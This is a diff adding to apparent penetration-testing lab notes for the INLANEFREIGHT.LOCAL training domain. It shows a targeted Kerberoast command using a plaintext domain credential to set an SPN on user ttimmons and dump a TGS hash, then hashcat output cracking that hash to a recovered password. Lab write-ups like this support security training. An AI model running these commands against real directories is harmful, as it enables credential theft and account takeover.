@@ -2443,3 +2443,82 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\mssq
 Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 
 ```
+
+more bloodhound img
+
+```
+python3 targetedKerberoast.py -v -d 'INLANEFREIGHT.LOCAL' -u 'mssqladm' -p 'DBAilfreight1!' --dc-ip 172.16.8.3 --request-user ttimmons
+[*] Starting kerberoast attacks
+[*] Attacking user (ttimmons)
+[VERBOSE] SPN added successfully for (ttimmons)
+[+] Printing hash for (ttimmons)
+$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$e237055db7f0263163588236a6b70956$0d33f0c0be27aa2a1dc34b0560e91448a719ae203e31fec3f8cf183589ceb2b283c807d6d274ff70cd229bea5d022170281b5ad0cc9e573d61ddfc370cbc1d29798f82381d75b220c582128314af65c37b465d636c3dcbf551287e0f5634007b30c80e32a36a35299fcf8ff71c8cc8bbb450e07bf91c58ac15803681b167c0926d3f2f6d812a18b0703e7c7162ef9ea8a513c521098ce31179f0b78bf922467e263bd749e59e8c2140f8bc094a0b35427805444c0aee92bd49c6adfb686413dd98ece7b5477aa731228adc3092c9cc2b29deeeaea707060772a18ecf6a0a43b154e8eb6de8797031ac10935867b63fdf7423e4ab8dad6dd0eaf3b85602d6074ee2b54c5a9c736149950f41c3ba4c2e492726e347560ebceed61199dd9f38d91f1c4afcfc40a3085d74a826f6f9e742eeecd6d4a76d033eb5eda4c17abb738fb807d67ee56351fa843495ba28bdea9dc97ab295a4d2bf317ff888f86851958619594db523c3b0cad280c3165543484cbde6692e36643c81ede8a3db58c463c2c108f8dcbc65d01a592a6efc0700f8282729376bccec0823ebce023d01225c88d26d1ad9fd42faf5b1df224cf62d6be961c5655e10cdbe17b7203b5f0d0c43593ccf12e4e1ec038e3b2d99e9c986e0290a5994588b177d1835b44f357a95efa6bf7bd12e6e3863dcdf2d785b2cf383e9b73a8ee93ef8f5c2497808dd9b3557d2d1c08fdc048bbb76747e710ef7c8d0e9c19e8c720c8c21a0a314f13e3c35ccf69d6b495c39dcaf764219be8f7f3d56b855e875843c3e447e100b4d3f8da6568d572ef53c9a787061eb84a98101951014cc0082f3fb8f39d96dc8ef7623485025b2471d50f943783879e6a4ad721abebcb0a9cf1a31bd6b23d52709e173351ad66165cf4f57b44abdefff59f9c269665c4653c64a4b215f08ef1913f2dad3f88de5c96909e48f09082b20279c6add4064cf53b54e46d75bac1ae0cc3dac4e9d23d16ed849f5c33260e949c6614851f7e0825d3d1661ee045f32f7959fd0223ff124c28256bf279297a7afd800ec8ade41991085711568441e5175649f00cb0830d756c97ab7bfc92ee891435ff57f1bacab1288490e321a0f578496849b582a60b2754b1464fffeb62c16947e74bd1d67faedc81c1734c82aaf7a8a0774c604bd2648a5be0b096fe2233c879da5116fb916d5e700b6740d90a9d5f16ae85687c28489fa00fdf4c0c28bdad17c1e87a71173061f7f409921b3d2713b1d7aa566641928b209dc7497b8795f6c1c89142e5cda7205c38e032106169073fd833205e649ba5ee9b9690494adaca182ece00b9389ca9afdc7f3791e9d9d4ccc370c562f3b5cfca7a6
+[VERBOSE] SPN removed successfully for (ttimmons)
+
+```
+
+```
+hashcat -m 13100 ttimmons.hash /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1468/2937 MB (1468 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (787 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$e237055db7f0263163588236a6b70956$0d33f0c0be27aa2a1dc34b0560e91448a719ae203e31fec3f8cf183589ceb2b283c807d6d274ff70cd229bea5d022170281b5ad0cc9e573d61ddfc370cbc1d29798f82381d75b220c582128314af65c37b465d636c3dcbf551287e0f5634007b30c80e32a36a35299fcf8ff71c8cc8bbb450e07bf91c58ac15803681b167c0926d3f2f6d812a18b0703e7c7162ef9ea8a513c521098ce31179f0b78bf922467e263bd749e59e8c2140f8bc094a0b35427805444c0aee92bd49c6adfb686413dd98ece7b5477aa731228adc3092c9cc2b29deeeaea707060772a18ecf6a0a43b154e8eb6de8797031ac10935867b63fdf7423e4ab8dad6dd0eaf3b85602d6074ee2b54c5a9c736149950f41c3ba4c2e492726e347560ebceed61199dd9f38d91f1c4afcfc40a3085d74a826f6f9e742eeecd6d4a76d033eb5eda4c17abb738fb807d67ee56351fa843495ba28bdea9dc97ab295a4d2bf317ff888f86851958619594db523c3b0cad280c3165543484cbde6692e36643c81ede8a3db58c463c2c108f8dcbc65d01a592a6efc0700f8282729376bccec0823ebce023d01225c88d26d1ad9fd42faf5b1df224cf62d6be961c5655e10cdbe17b7203b5f0d0c43593ccf12e4e1ec038e3b2d99e9c986e0290a5994588b177d1835b44f357a95efa6bf7bd12e6e3863dcdf2d785b2cf383e9b73a8ee93ef8f5c2497808dd9b3557d2d1c08fdc048bbb76747e710ef7c8d0e9c19e8c720c8c21a0a314f13e3c35ccf69d6b495c39dcaf764219be8f7f3d56b855e875843c3e447e100b4d3f8da6568d572ef53c9a787061eb84a98101951014cc0082f3fb8f39d96dc8ef7623485025b2471d50f943783879e6a4ad721abebcb0a9cf1a31bd6b23d52709e173351ad66165cf4f57b44abdefff59f9c269665c4653c64a4b215f08ef1913f2dad3f88de5c96909e48f09082b20279c6add4064cf53b54e46d75bac1ae0cc3dac4e9d23d16ed849f5c33260e949c6614851f7e0825d3d1661ee045f32f7959fd0223ff124c28256bf279297a7afd800ec8ade41991085711568441e5175649f00cb0830d756c97ab7bfc92ee891435ff57f1bacab1288490e321a0f578496849b582a60b2754b1464fffeb62c16947e74bd1d67faedc81c1734c82aaf7a8a0774c604bd2648a5be0b096fe2233c879da5116fb916d5e700b6740d90a9d5f16ae85687c28489fa00fdf4c0c28bdad17c1e87a71173061f7f409921b3d2713b1d7aa566641928b209dc7497b8795f6c1c89142e5cda7205c38e032106169073fd833205e649ba5ee9b9690494adaca182ece00b9389ca9afdc7f3791e9d9d4ccc370c562f3b5cfca7a6:Repeat09
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFRE...fca7a6
+Time.Started.....: Sat Nov 14 16:07:33 2026 (6 secs)
+Time.Estimated...: Sat Nov 14 16:07:39 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  1855.1 kH/s (1.85ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10678272/14344385 (74.44%)
+Rejected.........: 0/10678272 (0.00%)
+Restore.Point....: 10674176/14344385 (74.41%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: RipBMB420 -> Redeye2
+Hardware.Mon.#01.: Util: 78%
+
+Started: Sat Nov 14 16:07:31 2026
+Stopped: Sat Nov 14 16:07:39 2026
+
+```
+
+ttimmons:Repeat09
